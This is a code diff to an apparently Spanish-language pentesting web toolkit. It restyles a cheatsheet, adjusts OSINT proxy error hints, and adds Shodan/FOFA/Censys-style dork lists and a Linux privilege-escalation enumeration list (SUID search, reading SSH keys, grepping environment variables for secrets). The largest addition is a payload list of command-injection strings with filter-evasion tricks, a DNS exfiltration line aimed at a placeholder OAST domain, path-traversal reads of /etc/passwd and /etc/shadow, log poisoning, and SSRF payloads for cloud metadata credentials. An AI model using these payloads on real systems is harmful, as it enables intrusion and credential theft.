@@ -3175,6 +3175,22 @@ html.tab-hidden *, html.tab-hidden *::before, html.tab-hidden *::after{ animatio
 @media (prefers-reduced-motion: reduce){
   *{ animation-duration:.01ms !important; animation-iteration-count:1 !important; transition-duration:.01ms !important; scroll-behavior:auto !important; }
 }
+/* ── Cheatsheet: estilo hacker (terminal verde/rojo) ── */
+#cheatsheet .cs-tabs{gap:6px;border-bottom:1px dashed #1f3a2a;}
+#cheatsheet .cs-tab{font-family:var(--mono);text-transform:uppercase;letter-spacing:.08em;font-size:12px;padding:6px 11px;border:1px solid #1f3a2a;background:#06100b;color:#7cffb0;border-radius:4px;cursor:pointer;transition:all .15s;}
+#cheatsheet .cs-tab:hover{border-color:#39ff88;color:#39ff88;}
+#cheatsheet .cs-tab.active{background:#0f2a1a;border-color:#39ff88;color:#39ff88;box-shadow:0 0 14px rgba(57,255,136,.35);}
+#cheatsheet .cs-filter{font-family:var(--mono);background:#020504;border:1px solid #1f3a2a;color:#39ff88;}
+#cheatsheet .cs-filter::placeholder{color:#3d6b4c;}
+#cheatsheet .cmd-card{position:relative;overflow:hidden;background:#06100b;border:1px solid #17321f;border-left:3px solid #39ff88;border-radius:6px;padding:12px 14px;}
+#cheatsheet .cmd-card::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(57,255,136,.035) 0 1px,transparent 1px 3px);pointer-events:none;}
+#cheatsheet .cmd-card:hover{border-color:#39ff88;box-shadow:0 0 18px rgba(57,255,136,.18);}
+#cheatsheet .cmd-name{font-family:var(--mono);text-transform:uppercase;letter-spacing:.06em;font-size:13px;color:#39ff88;}
+#cheatsheet .cmd-name::before{content:"> ";color:#ff3b5c;}
+#cheatsheet .cmd-desc{color:#7fa890;font-size:12.5px;}
+#cheatsheet .cmd-code{background:#020504;border:1px dashed #1f3a2a;border-radius:4px;}
+#cheatsheet .cmd-code code{color:#b6ffd0;}
+#cheatsheet .copy-btn{color:#39ff88;}
 </style>
 
 <script type="application/ld+json">
@@ -6404,7 +6420,7 @@ table.nxa-table td{padding:6px 10px;border-bottom:1px solid #141a24;vertical-ali
             var w; try{ w=JSON.parse(tx); }catch(e){ return {ok:false,error:'respuesta no JSON',detail:tx.slice(0,300),ms:ms}; }
             if(w.error) return {ok:false,error:(w.blocked?'bloqueado':(w.error||'error')),detail:'proxy: '+w.error,ms:ms};
             var up=w.status||0;
-            if(up>=400) return {ok:false,error:'upstream '+up,detail:'el motor respondió HTTP '+up+((up===401||up===403)?' — el Worker no inyecta API key para este motor':'')+': '+String(w.body||'').slice(0,300),ms:ms};
+            if(up>=400) return {ok:false,error:'upstream '+up,detail:'el motor respondió HTTP '+up+((up===401||up===403)?' — credencial rechazada':'')+': '+String(w.body||'').slice(0,300),ms:ms};
             var j; try{ j=JSON.parse(w.body); }catch(e){ j={raw:String(w.body||'').slice(0,2000)}; }
             return {ok:true,data:j,ms:ms};
           }); });
@@ -6456,7 +6472,7 @@ table.nxa-table td{padding:6px 10px;border-bottom:1px solid #141a24;vertical-ali
           logLine((n.cves.length||rp.length)?'hit':'ok','✓ '+(SRC_LABELS[s]||s)+' '+r.ms+'ms · '+n.ports.length+' puertos · '+rp.length+' de riesgo · '+n.cves.length+' CVE · '+n.leaks.length+' fugas');
           addBlip(!!(n.cves.length||rp.length));
         } else {
-          state.last.sources[s]={__error:r.error||'sin respuesta'}; renderCard(s,'err',r.error||'sin respuesta',0,r.detail);
+          state.last.sources[s]={__error:r.error||'sin respuesta'}; var hh=hintFor(s,r.detail); renderCard(s,'err',r.error||'sin respuesta',0,(r.detail||'')+(hh?(' · → '+hh):''));
           logLine('hit','✕ '+(SRC_LABELS[s]||s)+' · '+(r.error||'sin respuesta')+(r.detail?(' · '+r.detail):'')+(state.userAbort?'':' · las demás siguen'));
         }
       });
@@ -6535,6 +6551,7 @@ table.nxa-table td{padding:6px 10px;border-bottom:1px solid #141a24;vertical-ali
   /* ---- diagnóstico de errores de motor: explica la causa y qué tocar ---- */
   var KEYNAME={shodan:'SHODAN_KEY',netlas:'NETLAS_KEY',leakix:'LEAKIX_KEY',hunter:'HUNTER_KEY',fofa:'FOFA_KEY',censys:'CENSYS_PAT'};
   function hintFor(src,d){ d=String(d||'');
+    if(src==='censys' && /401|Unauthorized|credentials are invalid/i.test(d)) return 'Censys rechazó el token (PAT). Creá un PAT nuevo en Censys (Platform), revocá el anterior y cargalo: npx wrangler secret put CENSYS_PAT. Si tu cuenta tiene organización, también: npx wrangler secret put CENSYS_ORG_ID.';
     var mk=d.match(/missing_key:([A-Z_]+)/); if(mk) return 'Falta el secret '+mk[1]+' en el Worker: npx wrangler secret put '+mk[1]+' y después npx wrangler deploy.';
     if(/Just a moment|cf-mitigated|challenge-platform|HTML de Cloudflare/i.test(d)) return 'Cloudflare devolvió un challenge en vez de datos. Causa típica: el Worker no tiene la key del motor (secret '+(KEYNAME[src]||'?')+') o la IP del Worker está challengeada. Cargá el secret y reintentá.';
     if(/decommissioned|Legacy Search/i.test(d)) return 'Censys Legacy Search fue dada de baja (30/09/2026). Censys queda fuera de la búsqueda por país.';
@@ -6559,7 +6576,7 @@ table.nxa-table td{padding:6px 10px;border-bottom:1px solid #141a24;vertical-ali
         var w; try{ w=JSON.parse(tx); }catch(e){ return {ok:false,error:'respuesta no JSON',detail:tx.slice(0,300),ms:ms}; }
         if(w.error) return {ok:false,error:(w.blocked?'bloqueado':(w.error||'error')),detail:'proxy: '+w.error,ms:ms};
         var up=w.status||0;
-        if(up>=400) return {ok:false,error:'upstream '+up,detail:'el motor respondió HTTP '+up+((up===401||up===403)?' — falta API key en el Worker':'')+': '+cleanBody(w.body),ms:ms};
+        if(up>=400) return {ok:false,error:'upstream '+up,detail:'el motor respondió HTTP '+up+((up===401||up===403)?' — credencial rechazada':'')+': '+cleanBody(w.body),ms:ms};
         var j; try{ j=JSON.parse(w.body); }catch(e){ j={raw:String(w.body||'').slice(0,2000)}; }
         return {ok:true,data:j,ms:ms};
       }); })
@@ -12500,6 +12517,63 @@ const csData = {
  { name:"Ver hashes crackeados",               cmd:"hashcat -m 1000 ntlm.txt --show",                                     desc:"Mostrar resultados previos" },
  ],
 
+ fofa:[
+ { name:"Por dominio",        cmd:"domain=\"example.com\"",                         desc:"Hosts/subdominios asociados al dominio" },
+ { name:"Por título HTML",    cmd:"title=\"Dashboard\" && country=\"CL\"",           desc:"Páginas con un título concreto en un país" },
+ { name:"Paneles de login",   cmd:"title=\"login\" || title=\"admin\" || body=\"wp-login\"", desc:"Paneles de administración comunes" },
+ { name:"Cuerpo de página",   cmd:"body=\"Grafana\" && port=\"3000\"",              desc:"Texto dentro del HTML + puerto" },
+ { name:"Headers / server",   cmd:"header=\"X-Jenkins\" || server=\"nginx/1.14\"",   desc:"Cabeceras HTTP o versión de servidor" },
+ { name:"Certificado TLS",    cmd:"cert=\"example.com\" && port=\"443\"",            desc:"Hosts con certificado que nombra el dominio" },
+ { name:"Favicon hash",       cmd:"icon_hash=\"-247388890\"",                       desc:"Huella del favicon — encuentra instancias del mismo producto" },
+ { name:"Producto / app",     cmd:"product=\"Elasticsearch\" && country=\"CL\"",     desc:"Servicios identificados por producto" },
+ { name:"Excluir ruido",      cmd:"domain=\"example.com\" && title!=\"404\"",       desc:"Negación con != para quitar falsos positivos" },
+ { name:"Puerto + protocolo", cmd:"port=\"6379\" && protocol=\"redis\"",            desc:"Servicios no-HTTP por protocolo" },
+ { name:"Por IP / rango",     cmd:"ip=\"203.0.113.0/24\" && port=\"22\"",            desc:"Rango CIDR con puerto específico" },
+ ],
+ shodan:[
+ { name:"Por hostname",       cmd:"hostname:example.com",                           desc:"Hosts cuyo nombre (incl. subdominios) coincide" },
+ { name:"Título HTTP",        cmd:"http.title:\"Dashboard\" country:CL",            desc:"Título de la página + país" },
+ { name:"HTML del cuerpo",    cmd:"http.html:\"wp-content\" port:443",              desc:"Contenido HTML de la respuesta" },
+ { name:"Certificado SSL",    cmd:"ssl.cert.subject.cn:example.com",                desc:"Certificados emitidos para el dominio" },
+ { name:"Producto + versión", cmd:"product:\"nginx\" version:\"1.14\"",             desc:"Software y versión detectados" },
+ { name:"Por CVE",            cmd:"vuln:CVE-2021-44228",                            desc:"Hosts marcados con esa vulnerabilidad (Log4Shell)" },
+ { name:"Por organización",   cmd:"org:\"Entel\" port:22",                          desc:"Rango de una organización + puerto" },
+ { name:"Por ASN",            cmd:"asn:AS13335",                                    desc:"Todos los hosts de un sistema autónomo" },
+ { name:"Estado HTTP",        cmd:"http.status:200 http.title:\"login\"",           desc:"Respuestas exitosas con título de login" },
+ { name:"Excluir",            cmd:"hostname:example.com -port:80",                  desc:"Negación con - delante del filtro" },
+ ],
+ censys:[
+ { name:"Por país y puerto",  cmd:"host.location.country = \"CL\" and host.services.port = 443", desc:"Hosts de un país en un puerto (CenQL)" },
+ { name:"Dominio en DNS",     cmd:"host.dns.names = \"example.com\"",                desc:"Hosts cuyo DNS apunta al dominio" },
+ { name:"Título HTML",        cmd:"host.services.http.response.html_title: \"Dashboard\"", desc:"Título de la respuesta HTTP" },
+ { name:"Certificado",        cmd:"host.services.tls.certificates.leaf_data.names: \"example.com\"", desc:"Nombres del certificado hoja" },
+ { name:"Software",           cmd:"host.services.software.product = \"nginx\"",      desc:"Producto de servicio detectado" },
+ { name:"ASN",                cmd:"host.autonomous_system.asn = 13335",              desc:"Hosts de un sistema autónomo" },
+ { name:"Servicio concreto",  cmd:"host.services.port = 6379 and host.services.service_name = \"REDIS\"", desc:"Servicio no-HTTP expuesto" },
+ ],
+ netlas:[
+ { name:"Dominio",            cmd:"domain:\"example.com\"",                          desc:"Hosts y subdominios del dominio" },
+ { name:"Título HTTP",        cmd:"domain:\"example.com\" AND http.title:\"login\"",  desc:"Paneles de login dentro del dominio" },
+ { name:"Cuerpo HTTP",        cmd:"http.body:\"Grafana\" AND port:3000",             desc:"Texto en la respuesta + puerto" },
+ { name:"Certificado",        cmd:"certificate.subject.cn:\"example.com\"",          desc:"Certificados emitidos para el dominio" },
+ { name:"Por país",           cmd:"country:\"CL\" AND port:9200",                    desc:"Elasticsearch expuesto en un país" },
+ { name:"Por IP",             cmd:"ip:\"203.0.113.10\"",                            desc:"Todos los datos de una IP" },
+ ],
+ leakix:[
+ { name:"Por host",           cmd:"+host:example.com",                              desc:"Servicios de un host (filtros con +)" },
+ { name:"Por IP",             cmd:"+ip:203.0.113.10",                               desc:"Servicios de una IP concreta" },
+ { name:"Por puerto",         cmd:"+port:9200 +country:CL",                         desc:"Puerto + país" },
+ { name:"Por plugin",         cmd:"+plugin:Elasticsearch",                          desc:"Hallazgos por plugin/servicio (verificar nombres en la UI)" },
+ { name:"Excluir",            cmd:"+host:example.com -port:80",                     desc:"Negación con - delante del filtro" },
+ ],
+ hunter:[
+ { name:"Dominio",            cmd:"domain=\"example.com\"",                          desc:"Hosts asociados al dominio" },
+ { name:"Título web",         cmd:"web.title=\"login\" && domain=\"example.com\"",   desc:"Títulos de página dentro del dominio" },
+ { name:"Cuerpo web",         cmd:"web.body=\"Grafana\" && port=\"3000\"",           desc:"Contenido web + puerto" },
+ { name:"Certificado",        cmd:"cert.subject.cn=\"example.com\"",                 desc:"Certificados por CN" },
+ { name:"Por país",           cmd:"country=\"CL\" && port=\"9200\"",                 desc:"Puerto + país (verificar código en la doc)" },
+ { name:"Por IP",             cmd:"ip=\"203.0.113.10\"",                             desc:"Datos de una IP concreta" },
+ ],
 };
 
 const toolLabels = {
@@ -12514,7 +12588,8 @@ const toolLabels = {
  enum_ad:'Enum AD', bloodhound:'BloodHound', kerb_atk:'Kerberos/Impacket',
  responder_relay:'Responder/Relay', post_ad:'Post-Exploit AD',
  privesc_win:'Privesc Windows', powerview:'PowerView',
- certipy:'Certipy AD CS', hashcat_ad:'Hashcat AD'
+ certipy:'Certipy AD CS', hashcat_ad:'Hashcat AD',
+ fofa:'FOFA', shodan:'Shodan', censys:'Censys', netlas:'Netlas', leakix:'LeakIX', hunter:'Hunter.how'
 };
 
 let activeTool = 'nmap';
@@ -14232,6 +14307,28 @@ bash:{
   {c:'for i in {1..254}; do ping -c 1 -W 1 10.10.10.$i 2>/dev/null | grep "64 bytes" & done',d:'Ping sweep r\u00E1pido en bash'},
  ]
  },
+ {id:'linuxlab', icon:'🐧', label:'Linux · Lab de enumeración local',
+  cmds:[
+  {c:'id',d:'UID, GID y grupos del usuario actual'},
+  {c:'cat /etc/os-release',d:'Distribución y versión exacta'},
+  {c:'uname -a',d:'Kernel y arquitectura (buscar CVEs de kernel)'},
+  {c:'sudo -l',d:'Comandos que el usuario puede ejecutar con sudo'},
+  {c:'find / -perm -4000 -type f 2>/dev/null',d:'Binarios SUID — candidatos a privesc (GTFOBins)'},
+  {c:'getcap -r / 2>/dev/null',d:'Capabilities peligrosas (cap_setuid, cap_dac_override)'},
+  {c:'find / -writable -type d 2>/dev/null | grep -v -e proc -e sys',d:'Directorios escribibles por el usuario'},
+  {c:'ls -la /etc/cron* /etc/crontab',d:'Tareas programadas del sistema'},
+  {c:'systemctl list-timers --all',d:'Timers de systemd y su ejecución'},
+  {c:'ps auxf',d:'Árbol de procesos — ver quién corre qué'},
+  {c:'ss -tulpn',d:'Puertos en escucha y proceso dueño'},
+  {c:'cat /proc/1/cgroup',d:'Detectar si estás dentro de un contenedor'},
+  {c:'ls -la ~/.ssh',d:'Claves SSH del usuario'},
+  {c:'env | grep -iE \"key|token|pass|secret\"',d:'Secretos filtrados en variables de entorno'},
+  {c:'ls -la /var/www /opt /srv 2>/dev/null',d:'Aplicaciones web y servicios típicos'},
+  {c:'find / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.conf\" 2>/dev/null | head -50',d:'Respaldos y configs olvidadas'},
+  {c:'ls -la /etc/sudoers.d',d:'Reglas sudo adicionales'},
+  {c:'ls /home',d:'Usuarios locales con home'},
+  ]
+ },
  ],
  db:{}
 },
@@ -15890,6 +15987,7 @@ var PAY_CATS = [
  {id:'upload', label:'File Upload'},
  {id:'graphql',label:'GraphQL'},
  {id:'crlf',   label:'CRLF / Header Inj'},
+ {id:'linux',  label:'🐧 Linux (solo)'},
 ];
 
 var PAYLOADS = {
@@ -16182,6 +16280,9 @@ var PAYLOADS = {
  {label:'Deep recursion DoS', pay:'{a{b{a{b{a{b{a{b...}}}}}}}}', note:'Consulta anidada profunda para agotar recursos (DoS)', risk:'alto'},
  {label:'IDOR vía node(id)', pay:'{node(id:"VXNlcjox"){... on User{email}}}', note:'IDs base64 predecibles → acceso a objetos de otros usuarios', risk:'alto'},
  {label:'Mutation sin auth', pay:'mutation{updateUser(id:2,role:"admin"){id}}', note:'Probar mutations sensibles sin token de autorización', risk:'alto'},
+ {label:'Null byte legacy (PHP<5.3)', pay:'../../../../etc/passwd%00', note:'Trunca la extensión forzada por el backend (legado)', risk:'alto'},
+ {label:'Punto y coma doble-encode', pay:'%253Bid', note:';id doblemente encodeado — pasa filtros de una sola decodificación', risk:'alto'},
+ {label:'Punto y coma fullwidth', pay:'%EF%BC%9Bid', note:'Fullwidth que algunos backends normalizan a ;', risk:'alto'},
  ],
  crlf:[
  {label:'CRLF header injection', pay:'%0d%0aSet-Cookie:sessionid=attacker', note:'Inyecta un header Set-Cookie si el input va a un header sin sanear', risk:'alto'},
@@ -16189,6 +16290,30 @@ var PAYLOADS = {
  {label:'Response splitting', pay:'%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a', note:'Inyecta una segunda respuesta HTTP completa (cache poisoning)', risk:'alto'},
  {label:'Log injection', pay:'admin%0d%0a[INFO] Usuario admin autenticado OK', note:'Falsifica entradas en logs si el input se loguea sin escapar'},
  {label:'Host header SSRF', pay:'Host: 169.254.169.254', note:'Cambiar el Host para apuntar a metadata interna (SSRF)', risk:'alto'},
+ ],
+ linux:[
+ {label:'CMDi: separador ;id', pay:';id', note:'Si el input llega a un shell, la salida de id aparece en la respuesta', risk:'alto'},
+ {label:'CMDi: sustitución $()', pay:'$(id)', note:'Sustitución de comando POSIX (bash/sh)', risk:'alto'},
+ {label:'CMDi: backticks', pay:'`id`', note:'Variante clásica con backticks', risk:'alto'},
+ {label:'CMDi: pipe + newline', pay:'|id%0a', note:'Pipe y salto de línea URL-encodeados', risk:'alto'},
+ {label:'CMDi: bypass ${IFS}', pay:'cat${IFS}/etc/passwd', note:'${IFS} reemplaza el espacio — evade filtros que bloquean espacios', risk:'alto'},
+ {label:'CMDi: brace expansion', pay:'{cat,/etc/passwd}', note:'Brace expansion de bash — sin espacios ni barras literales', risk:'alto'},
+ {label:'CMDi: globbing', pay:'/???/c?t /???/p??s??', note:'Comodines: resuelve /bin/cat /etc/passwd sin escribir los nombres', risk:'alto'},
+ {label:'CMDi: comillas partidas', pay:"c''at /etc/pa''sswd", note:'Comillas vacías dentro del comando — rompe el match literal de cat', risk:'alto'},
+ {label:'CMDi: ciega por tiempo', pay:';sleep${IFS}10;', note:'Si la respuesta tarda ~10 s, el input llega al shell', risk:'alto'},
+ {label:'CMDi: OOB por DNS', pay:';nslookup $(whoami).<OAST_DOMAIN>', note:'Exfiltra whoami por DNS hacia tu dominio OAST (interactsh / Collaborator)', risk:'alto'},
+ {label:'LFI: passwd clásico', pay:'../../../../../../etc/passwd', note:'Path traversal estándar hacia /etc/passwd', risk:'medio'},
+ {label:'LFI: filtro anidado', pay:'....//....//....//etc/passwd', note:'Bypassa filtros que eliminan ../ una sola vez', risk:'alto'},
+ {label:'LFI: /proc/self/environ', pay:'../../../../proc/self/environ', note:'Variables del proceso (PATH, HOME, secretos) — paso previo a RCE vía env', risk:'alto'},
+ {label:'LFI: /proc/self/cmdline', pay:'../../../../proc/self/cmdline', note:'Línea de comando del proceso web — revela flags y rutas internas', risk:'alto'},
+ {label:'LFI: wrapper base64 PHP', pay:'php://filter/convert.base64-encode/resource=/etc/passwd', note:'Lee código fuente PHP en base64 sin ejecutarlo', risk:'alto'},
+ {label:'LFI: access.log (poisoning)', pay:'../../../../var/log/apache2/access.log', note:'Si inyectás código en User-Agent y luego incluís el log → RCE', risk:'alto'},
+ {label:'LFI: /etc/shadow (si es root)', pay:'../../../../etc/shadow', note:'Prueba de impacto: solo si el proceso corre como root', risk:'alto'},
+ {label:'SSRF: AWS IMDSv1 credenciales', pay:'http://169.254.169.254/latest/meta-data/iam/security-credentials/', note:'Lista el rol IAM de la instancia EC2 — credenciales temporales', risk:'alto'},
+ {label:'SSRF: GCP metadata', pay:'http://metadata.google.internal/computeMetadata/v1/?recursive=true', note:'Requiere header Metadata-Flavor: probarlo si el SSRF permite headers', risk:'alto'},
+ {label:'SSRF: Redis vía gopher', pay:'gopher://127.0.0.1:6379/_INFO', note:'Habla RESP con Redis interno — reconocimiento de servicios locales', risk:'alto'},
+ {label:'SSRF: IPv6 mapeada', pay:'http://[::ffff:169.254.169.254]/', note:'Bypass de filtros que bloquean 169.254.169.254 en IPv4', risk:'alto'},
+ {label:'SSRF: file:// local', pay:'file:///etc/passwd', note:'Lectura local si el cliente HTTP soporta file://', risk:'alto'},
  ],
 };
 
